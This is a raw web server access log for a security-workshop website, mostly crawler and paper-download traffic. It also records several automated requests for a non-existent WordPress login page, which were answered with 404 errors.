66.249.73.91 - - [26/Apr/2018:08:04:23 -0400] "GET /papers/2004/nspw2004-gates.pdf HTTP/1.1" 200 148275 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:08:05:14 -0400] "GET /2002/program.shtml HTTP/1.1" 200 6706 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:08:05:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [26/Apr/2018:08:06:59 -0400] "GET /papers/2012/docs/organization.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
213.239.212.117 - - [26/Apr/2018:08:07:04 -0400] "GET /robots.txt HTTP/1.1" 200 5950 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:07:15 -0400] "GET /1999/cfp.pdf HTTP/1.1" 200 33328 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:07:26 -0400] "GET /1999/cfp.ps HTTP/1.1" 200 65252 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:07:37 -0400] "GET /1999/cfp.txt HTTP/1.1" 200 6480 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
77.88.47.40 - - [26/Apr/2018:08:07:47 -0400] "GET /2009/?C=S;O=A HTTP/1.1" 200 5410 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
213.239.212.117 - - [26/Apr/2018:08:07:48 -0400] "GET /1999/program_print.html HTTP/1.1" 200 5384 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [26/Apr/2018:08:07:50 -0400] "GET /2008/cfp2008-old.pdf HTTP/1.1" 200 17926 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
213.239.212.117 - - [26/Apr/2018:08:07:59 -0400] "GET /2006/cfp.shtml HTTP/1.1" 200 7512 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:08:10 -0400] "GET /2006/cfp2006.pdf HTTP/1.1" 200 40884 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:08:21 -0400] "GET /2006/dates.shtml HTTP/1.1" 200 4893 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.93.87 - - [26/Apr/2018:08:08:23 -0400] "GET / HTTP/1.1" 200 6604 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.93.91 - - [26/Apr/2018:08:08:23 -0400] "GET /favicon.ico HTTP/1.1" 404 4094 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
213.239.212.117 - - [26/Apr/2018:08:08:32 -0400] "GET /2006/index.shtml HTTP/1.1" 200 5292 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.87 - - [26/Apr/2018:08:08:41 -0400] "GET /papers/2012/forms/contents.htm HTTP/1.1" 304 3604 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
213.239.212.117 - - [26/Apr/2018:08:08:43 -0400] "GET /2006/local.shtml HTTP/1.1" 200 4796 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:08:54 -0400] "GET /2006/nspw2006program.pdf HTTP/1.1" 404 7964 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:09:05 -0400] "GET /2006/oc.shtml HTTP/1.1" 200 5227 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:09:16 -0400] "GET /2006/papers.shtml HTTP/1.1" 200 4766 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:09:27 -0400] "GET /2006/past.shtml HTTP/1.1" 200 5499 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.87 - - [26/Apr/2018:08:09:34 -0400] "GET /papers/2001/ HTTP/1.1" 200 4382 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.221 - - [26/Apr/2018:08:09:36 -0400] "GET /2014 HTTP/1.1" 200 7173 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
213.239.212.117 - - [26/Apr/2018:08:09:38 -0400] "GET /2006/pc.shtml HTTP/1.1" 200 5629 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:09:49 -0400] "GET /2006/proceedings.shtml HTTP/1.1" 200 4719 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
77.88.47.40 - - [26/Apr/2018:08:09:52 -0400] "GET /2008/?C=D;O=A HTTP/1.1" 200 5567 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
213.239.212.117 - - [26/Apr/2018:08:10:00 -0400] "GET /2006/program.shtml HTTP/1.1" 200 6217 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:10:11 -0400] "GET /2006/submission.shtml HTTP/1.1" 200 5445 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:10:22 -0400] "GET /2009/cfp.html HTTP/1.1" 404 7942 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [26/Apr/2018:08:10:25 -0400] "GET /cfp/nspw2010-cfp.pdf HTTP/1.1" 200 60166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
213.239.212.117 - - [26/Apr/2018:08:10:33 -0400] "GET /2009/dates.html HTTP/1.1" 404 7946 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [26/Apr/2018:08:10:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
213.239.212.117 - - [26/Apr/2018:08:10:44 -0400] "GET /2009/index.html HTTP/1.1" 404 7946 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:10:55 -0400] "GET /2009/local.html HTTP/1.1" 404 7946 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:11:06 -0400] "GET /2009/oc.html HTTP/1.1" 404 7940 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:11:17 -0400] "GET /2009/past.html HTTP/1.1" 404 7944 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [26/Apr/2018:08:11:17 -0400] "GET /2012/papers HTTP/1.1" 200 7009 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
213.239.212.117 - - [26/Apr/2018:08:11:28 -0400] "GET /2009/pc.html HTTP/1.1" 404 7940 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:11:39 -0400] "GET /2009/program.html HTTP/1.1" 404 7950 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:11:50 -0400] "GET /2013/organizers HTTP/1.1" 200 6704 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
213.239.212.117 - - [26/Apr/2018:08:12:01 -0400] "GET /2013/papers HTTP/1.1" 200 6962 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.89 - - [26/Apr/2018:08:12:09 -0400] "GET /2015/sponsors HTTP/1.1" 200 6315 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
213.239.212.117 - - [26/Apr/2018:08:12:12 -0400] "GET /2013/program HTTP/1.1" 200 7260 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.87 - - [26/Apr/2018:08:12:59 -0400] "GET /2017 HTTP/1.1" 200 7049 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:08:14:44 -0400] "GET /papers/2004/nspw2004-zhou.pdf HTTP/1.1" 200 198793 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [26/Apr/2018:08:15:24 -0400] "GET /2003/?C=N;O=D HTTP/1.1" 200 5410 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [26/Apr/2018:08:15:36 -0400] "GET /2016/accepted HTTP/1.1" 200 6922 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:08:15:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [26/Apr/2018:08:16:28 -0400] "GET /2005/cfp/latex/main.tex HTTP/1.1" 200 91665 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:17:20 -0400] "GET /papers/2013/nspw2013-mathur.pdf HTTP/1.1" 200 1319255 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:18:12 -0400] "GET /papers/2006/nspw2006-naegoe.pdf HTTP/1.1" 200 267940 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:19:03 -0400] "GET /2008/oc.content.qq HTTP/1.1" 200 8408 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:19:55 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 200 660089 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.209.235.175 - - [26/Apr/2018:08:20:27 -0400] "GET /2013 HTTP/1.1" 200 6834 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
115.98.161.53 - - [26/Apr/2018:08:20:43 -0400] "GET /2009/proceedings/1993/nspw1993-slack.pdf HTTP/1.1" 200 519876 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.89 - - [26/Apr/2018:08:20:47 -0400] "GET /papers/1994/nspw1994-ferris.pdf HTTP/1.1" 200 508556 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [26/Apr/2018:08:20:48 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
112.207.111.251 - - [26/Apr/2018:08:21:15 -0400] "GET /wp-login.php HTTP/1.1" 404 7495 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.207.111.251 - - [26/Apr/2018:08:21:17 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [26/Apr/2018:08:21:39 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 200 689872 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:08:22:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [26/Apr/2018:08:22:31 -0400] "GET /papers/1993/nspw1993-strens.pdf HTTP/1.1" 200 721049 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:08:22:32 -0400] "GET /papers/1997/nspw1997-rahman.pdf HTTP/1.1" 200 1078358 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:08:23:22 -0400] "GET /papers/1996/nspw1996-olawsky.pdf HTTP/1.1" 200 1077941 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:24:14 -0400] "GET /papers/2011/nspw2011-feigenbaum.pdf HTTP/1.1" 200 601758 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.137.16.167 - - [26/Apr/2018:08:24:55 -0400] "GET /robots.txt HTTP/1.1" 200 5950 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [26/Apr/2018:08:25:06 -0400] "GET /login HTTP/1.1" 200 6267 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.137.16.167 - - [26/Apr/2018:08:25:10 -0400] "GET /2000/program.html HTTP/1.1" 200 8999 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:25:22 -0400] "GET /2002 HTTP/1.1" 301 3942 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:25:34 -0400] "GET /2002/ HTTP/1.1" 200 5101 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:25:46 -0400] "GET /2003 HTTP/1.1" 301 3942 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.89 - - [26/Apr/2018:08:25:58 -0400] "GET /papers/2002/nspw2002-williams.pdf HTTP/1.1" 200 1179718 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.137.16.167 - - [26/Apr/2018:08:25:58 -0400] "GET /2003/ HTTP/1.1" 200 5325 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:26:11 -0400] "GET /2004 HTTP/1.1" 301 3942 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:26:23 -0400] "GET /2004/ HTTP/1.1" 200 5418 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:26:36 -0400] "GET /2005 HTTP/1.1" 301 3942 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.87 - - [26/Apr/2018:08:26:50 -0400] "GET /papers/2001/nspw2001-raskin.pdf HTTP/1.1" 200 512638 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.91.13.15 - - [26/Apr/2018:08:26:52 -0400] "GET /2005/ HTTP/1.1" 200 5354 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:27:06 -0400] "GET /2006 HTTP/1.1" 301 3942 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:27:21 -0400] "GET /2006/ HTTP/1.1" 200 5292 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
69.162.124.227 - - [26/Apr/2018:08:27:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
91.137.16.167 - - [26/Apr/2018:08:27:33 -0400] "GET /2007 HTTP/1.1" 301 3942 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.91 - - [26/Apr/2018:08:27:41 -0400] "GET /papers/2008/nspw2008-bishop.pdf HTTP/1.1" 200 485862 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.91.13.15 - - [26/Apr/2018:08:27:45 -0400] "GET /2007/ HTTP/1.1" 200 5379 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:27:57 -0400] "GET /2008 HTTP/1.1" 301 3942 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:28:17 -0400] "GET /2008/ HTTP/1.1" 200 5424 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
91.137.16.167 - - [26/Apr/2018:08:28:29 -0400] "GET /past.html HTTP/1.1" 404 7923 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.87 - - [26/Apr/2018:08:28:33 -0400] "GET /2015/cfp HTTP/1.1" 200 9317 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:29:25 -0400] "GET /papers/1996/nspw1996-millen.pdf HTTP/1.1" 200 80535 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:30:17 -0400] "GET /papers/1997/nspw1997-timmerman.pdf HTTP/1.1" 200 1288232 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:31:09 -0400] "GET /papers/2000/nspw2000-marceau.pdf HTTP/1.1" 200 1076682 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:32:00 -0400] "GET /2002 HTTP/1.1" 301 3998 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:32:01 -0400] "GET /2002/ HTTP/1.1" 200 5157 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:08:32:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [26/Apr/2018:08:32:52 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 666930 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
94.103.232.82 - - [26/Apr/2018:08:32:48 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 200 418222 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
94.103.232.82 - - [26/Apr/2018:08:33:18 -0400] "GET / HTTP/1.1" 200 6636 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
202.131.110.172 - - [26/Apr/2018:08:33:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
202.131.110.172 - - [26/Apr/2018:08:33:25 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [26/Apr/2018:08:33:44 -0400] "GET /2006/cfp/?C=M;O=A HTTP/1.1" 403 3936 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:34:35 -0400] "GET /2009/proceedings/2013/nspw2013-egelman.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [26/Apr/2018:08:35:28 -0400] "GET /papers/2006/nspw2006-crawford.pdf HTTP/1.1" 200 401281 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:08:36:19 -0400] "GET /papers/1994/nspw1994-castano.pdf HTTP/1.1" 200 638901 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:37:11 -0400] "GET /2017/cfp HTTP/1.1" 200 8988 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [26/Apr/2018:08:37:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [26/Apr/2018:08:38:03 -0400] "GET /papers/1993/nspw1993-rooker-2.pdf HTTP/1.1" 200 572187 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:08:38:55 -0400] "GET /papers/2011/nspw2011-bicakci.pdf HTTP/1.1" 200 493585 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
179.199.152.82 - - [26/Apr/2018:08:38:57 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.199.152.82 - - [26/Apr/2018:08:38:59 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.164.232.34 - - [26/Apr/2018:08:39:11 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502580 "https://scholar.google.fr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
88.164.232.34 - - [26/Apr/2018:08:39:12 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2007/nspw2007-mannan.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.87 - - [26/Apr/2018:08:39:47 -0400] "GET /papers/2005/nspw2005-taylor-panel.pdf HTTP/1.1" 200 1269405 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
187.79.21.161 - - [26/Apr/2018:08:40:02 -0400] "GET /wp-login.php HTTP/1.1" 404 7495 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.79.21.161 - - [26/Apr/2018:08:40:03 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [26/Apr/2018:08:40:38 -0400] "GET /papers/1993/nspw1993-meadows.pdf HTTP/1.1" 200 322223 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
111.68.102.124 - - [26/Apr/2018:08:41:03 -0400] "GET /2009/proceedings/2000/nspw2000-mcdermott.pdf HTTP/1.1" 200 378066 "https://scholar.google.com.pk/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
58.186.201.98 - - [26/Apr/2018:08:41:07 -0400] "HEAD / HTTP/1.1" 200 3626 "http://nspw.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.76.70.34 - - [26/Apr/2018:08:41:10 -0400] "HEAD / HTTP/1.1" 200 3626 "http://nspw.org" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
125.209.235.182 - - [26/Apr/2018:08:41:14 -0400] "GET /2001 HTTP/1.1" 301 3944 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
111.68.102.124 - - [26/Apr/2018:08:41:23 -0400] "-" 408 3408 "-" "-"
111.68.102.124 - - [26/Apr/2018:08:41:23 -0400] "-" 408 3408 "-" "-"
111.68.102.124 - - [26/Apr/2018:08:41:23 -0400] "-" 408 3408 "-" "-"
157.55.39.221 - - [26/Apr/2018:08:41:31 -0400] "GET /papers/2014-pre/gates-nspw2014pre.pdf HTTP/1.1" 404 8543 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
175.158.216.35 - - [26/Apr/2018:08:42:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
175.158.216.35 - - [26/Apr/2018:08:42:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [26/Apr/2018:08:42:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [26/Apr/2018:08:42:22 -0400] "GET /papers/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 200 531515 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:42:36 -0400] "GET /papers/2008/nspw2008-bishop.pdf HTTP/1.1" 200 485862 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.102.173.71 - - [26/Apr/2018:08:43:00 -0400] "GET /robots.txt HTTP/1.1" 200 4496 "-" "Mozilla/5.0 (compatible; MojeekBot/0.6; +https://www.mojeek.com/bot.html)"
5.102.173.71 - - [26/Apr/2018:08:43:00 -0400] "GET /2016/cfp HTTP/1.1" 200 5108 "-" "Mozilla/5.0 (compatible; MojeekBot/0.6; +https://www.mojeek.com/bot.html)"
66.249.73.87 - - [26/Apr/2018:08:43:13 -0400] "GET /node/70 HTTP/1.1" 200 7006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [26/Apr/2018:08:44:05 -0400] "GET /2016/organizers HTTP/1.1" 200 7170 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
79.167.45.218 - - [26/Apr/2018:08:44:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.167.45.218 - - [26/Apr/2018:08:44:40 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [26/Apr/2018:08:44:57 -0400] "GET /papers/2011/nspw2011-du.pdf HTTP/1.1" 200 658178 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
